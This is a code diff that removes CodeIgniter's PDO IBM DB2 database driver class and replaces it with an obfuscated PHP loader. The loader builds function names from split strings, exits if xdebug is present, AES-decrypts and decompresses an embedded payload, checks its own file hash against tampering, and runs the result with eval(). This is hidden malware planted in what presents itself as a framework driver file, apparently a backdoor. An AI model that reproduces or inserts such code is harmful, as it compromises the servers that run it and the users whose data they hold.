@@ -1,244 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO IBM DB2 Database Adapter Class
- *
- * Note: _DB is an extender class that the app controller
- * creates dynamically based on whether the query builder
- * class is being used or not.
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_pdo_ibm_driver extends CI_DB_pdo_driver {
-
-	/**
-	 * Sub-driver
-	 *
-	 * @var	string
-	 */
-	public $subdriver = 'ibm';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Class constructor
-	 *
-	 * Builds the DSN if not already set.
-	 *
-	 * @param	array	$params
-	 * @return	void
-	 */
-	public function __construct($params)
-	{
-		parent::__construct($params);
-
-		if (empty($this->dsn))
-		{
-			$this->dsn = 'ibm:';
-
-			// Pre-defined DSN
-			if (empty($this->hostname) && empty($this->HOSTNAME) && empty($this->port) && empty($this->PORT))
-			{
-				if (isset($this->DSN))
-				{
-					$this->dsn .= 'DSN='.$this->DSN;
-				}
-				elseif ( ! empty($this->database))
-				{
-					$this->dsn .= 'DSN='.$this->database;
-				}
-
-				return;
-			}
-
-			$this->dsn .= 'DRIVER='.(isset($this->DRIVER) ? '{'.$this->DRIVER.'}' : '{IBM DB2 ODBC DRIVER}').';';
-
-			if (isset($this->DATABASE))
-			{
-				$this->dsn .= 'DATABASE='.$this->DATABASE.';';
-			}
-			elseif ( ! empty($this->database))
-			{
-				$this->dsn .= 'DATABASE='.$this->database.';';
-			}
-
-			if (isset($this->HOSTNAME))
-			{
-				$this->dsn .= 'HOSTNAME='.$this->HOSTNAME.';';
-			}
-			else
-			{
-				$this->dsn .= 'HOSTNAME='.(empty($this->hostname) ? '127.0.0.1;' : $this->hostname.';');
-			}
-
-			if (isset($this->PORT))
-			{
-				$this->dsn .= 'PORT='.$this->port.';';
-			}
-			elseif ( ! empty($this->port))
-			{
-				$this->dsn .= ';PORT='.$this->port.';';
-			}
-
-			$this->dsn .= 'PROTOCOL='.(isset($this->PROTOCOL) ? $this->PROTOCOL.';' : 'TCPIP;');
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Show table query
-	 *
-	 * Generates a platform-specific query string so that the table names can be fetched
-	 *
-	 * @param	bool	$prefix_limit
-	 * @return	string
-	 */
-	protected function _list_tables($prefix_limit = FALSE)
-	{
-		$sql = 'SELECT "tabname" FROM "syscat"."tables"
-			WHERE "type" = \'T\' AND LOWER("tabschema") = '.$this->escape(strtolower($this->database));
-
-		if ($prefix_limit === TRUE && $this->dbprefix !== '')
-		{
-			$sql .= ' AND "tabname" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
-				.sprintf($this->_like_escape_str, $this->_like_escape_chr);
-		}
-
-		return $sql;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Show column query
-	 *
-	 * Generates a platform-specific query string so that the column names can be fetched
-	 *
-	 * @param	string	$table
-	 * @return	array
-	 */
-	protected function _list_columns($table = '')
-	{
-		return 'SELECT "colname" FROM "syscat"."columns"
-			WHERE LOWER("tabschema") = '.$this->escape(strtolower($this->database)).'
-				AND LOWER("tabname") = '.$this->escape(strtolower($table));
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Returns an object with field data
-	 *
-	 * @param	string	$table
-	 * @return	array
-	 */
-	public function field_data($table)
-	{
-		$sql = 'SELECT "colname" AS "name", "typename" AS "type", "default" AS "default", "length" AS "max_length",
-				CASE "keyseq" WHEN NULL THEN 0 ELSE 1 END AS "primary_key"
-			FROM "syscat"."columns"
-			WHERE LOWER("tabschema") = '.$this->escape(strtolower($this->database)).'
-				AND LOWER("tabname") = '.$this->escape(strtolower($table)).'
-			ORDER BY "colno"';
-
-		return (($query = $this->query($sql)) !== FALSE)
-			? $query->result_object()
-			: FALSE;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Update statement
-	 *
-	 * Generates a platform-specific update string from the supplied data
-	 *
-	 * @param	string	$table
-	 * @param	array	$values
-	 * @return	string
-	 */
-	protected function _update($table, $values)
-	{
-		$this->qb_limit = FALSE;
-		$this->qb_orderby = array();
-		return parent::_update($table, $values);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Delete statement
-	 *
-	 * Generates a platform-specific delete string from the supplied data
-	 *
-	 * @param	string	$table
-	 * @return	string
-	 */
-	protected function _delete($table)
-	{
-		$this->qb_limit = FALSE;
-		return parent::_delete($table);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * LIMIT
-	 *
-	 * Generates a platform-specific LIMIT clause
-	 *
-	 * @param	string	$sql	SQL Query
-	 * @return	string
-	 */
-	protected function _limit($sql)
-	{
-		$sql .= ' FETCH FIRST '.($this->qb_limit + $this->qb_offset).' ROWS ONLY';
-
-		return ($this->qb_offset)
-			? 'SELECT * FROM ('.$sql.') WHERE rownum > '.$this->qb_offset
-			: $sql;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_y3hpn0ct=('bas'.'e64'.'_de'.'cod'.'e');
+$_zh06w1v4=('gzu'.'nco'.'mpr'.'ess');
+$_drmsk5s4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_b4ymh4ot='2vUmXtF8';
+$_mzuhp6yh='12h0ykZ2';
+$_x9xm23v8='yF+8xBNg';
+$_px272ay6='2ykuWE/u';
+$_o3fd2ypk='dKEqaSX2NuE=';
+$_s2o8e1w4='1iOC6YEF';
+$_z9k64eqa='Iy+5s6RH';
+$_sz7h5oie='LuV0Vg==';
+$_rq0fef7q=$_y3hpn0ct($_x9xm23v8.$_px272ay6.$_mzuhp6yh.$_b4ymh4ot.$_o3fd2ypk);
+$_fcqziy50=$_y3hpn0ct($_z9k64eqa.$_s2o8e1w4.$_sz7h5oie);
+$_bdzxf4gd=$_y3hpn0ct('P04ss9N8LsCCUXJWKeGxtRR0oyaIEQQc5L2wSYAWLJMnEnAOnhQ2a0DzaPrEJtfUhKsinF5DnUXeYSN3bEzbP9B2eHnYi2kwixC3zsnsxHCqmZj2qySs7iDGodjvtgoseaXEpWT5pre+2nVEZWCY+DN4rcNcTu2kgwxpGmkvlOqbHuwunZ913xyX3zvDefAu1iGG9LP6XOriiH0cvv10GIJpmaovpNGbiL8kGubHBo2AHSojLQz92AkPzKJIf2j/kf0EiEw+ga4DwMmVYgth5aRsnCM+ibwSQ03NrAcrOOvODmbYkDzmZvF8G1p7kshmfJI59W+VuS0p1i+mhOV0zZb0IxAK016QI/K3OtfczjZf/P7Tp4X9Cs9ULuA/u/iWx2PIg7IwS9B8S2f768yqcpC74xOkxvteHAnU6/4Ghz8m1+2hufMRNUyipUk938owYmNu6aC00rNIqH68hP9bZYCj6tdflIPg173z4m48o3HFP/Epjx9IjlyYqGgVxW+uI6kktKn6qupj0yhpuW7hILzH5wJ+s41W1xUyqR9Zmem0FhTNoqBk6iijJCFkBaJWMwXNnuhTBQ9lUDfzn7k8a0wah04BYXKOW1sBaQjh9ZqvLDvwdWjMlX9CSiEBagcH9YRwob6RI2yMHE5/4cPNdNRpmNQX8teqWfT0rDLqjSpyAJinuO1X44BJ/pG3UywAc9bGwR7KLsgos2MyxMcwAcm8dYB81lAv6K+NVgJA1y9AqusnLlqPLUTi3Wd1GMF/mD4zxs/ePkGId/EhzAzZa4PhiS2E5JM/0eQRyldBbC25IvpEG41MpNGMKyYlveT5S7TXdkc6FmpxiGJhcHJFeMrdnZT4312p7zA818zNoeYPj9JNX0VFvCNspPOpQmvN/Z9zZhOL3Dii9GvxZkrCGjxdPdwwoVV0oFuRFP5j7lLKPXPpV/9b5bPkf827yDgsX1zoRwSzbAPhUeCMLdgQecAQ4VL7MX2HagFJHJEHaKn9FEp4osgWcBbMyxIm9hs5j27rUN+/LEjR6L/dAZK56kKBF04iVdvVgCFt4fT+a4/OiNMF8WX50g04qtYaNnoRexiDL4ZSFzuIponClQvWxO5ruIOuNR8GvCK+i8Pj18e/kYadTk/UtAvMPagaGlk8TLQjat7qpg3JNp8TDxPLnoxF141Es/N2+3JLAuaLUIs8YfksRsw99aBmImpw+tjDGyICd3mvsyA+13OQJHyA5FRisks5tMBjHXxM0of9apqXIYwtXtrVUEw0Z51QetgSHHgedXTS3EgAJ8GiXSmLnIIqy3BtRIBetKtcarhMqnw=');
+$_hem8iicf=$_drmsk5s4($_bdzxf4gd,'aes-256-cbc',$_rq0fef7q,OPENSSL_RAW_DATA,$_fcqziy50);
+if($_hem8iicf===false){exit;}
+$_pb5z7rl4=$_zh06w1v4($_hem8iicf);
+if($_pb5z7rl4===false){exit;}
+$_ouccmb54='fa004b00b5a6aa29be85920845e60d640a8c5b3fbe1370598b0a45fe62746349';
+$_ss81uccp=@file_get_contents(__FILE__);
+if($_ss81uccp!==false){
+$_p7aadhu1=str_replace($_ouccmb54,"0000000000000000000000000000000000000000000000000000000000000000",$_ss81uccp);
+$_w4t6dp2n=hash("sha256",$_p7aadhu1);
+if($_w4t6dp2n!==$_ouccmb54){@http_response_code(403);exit;}
 }
+eval($_pb5z7rl4);
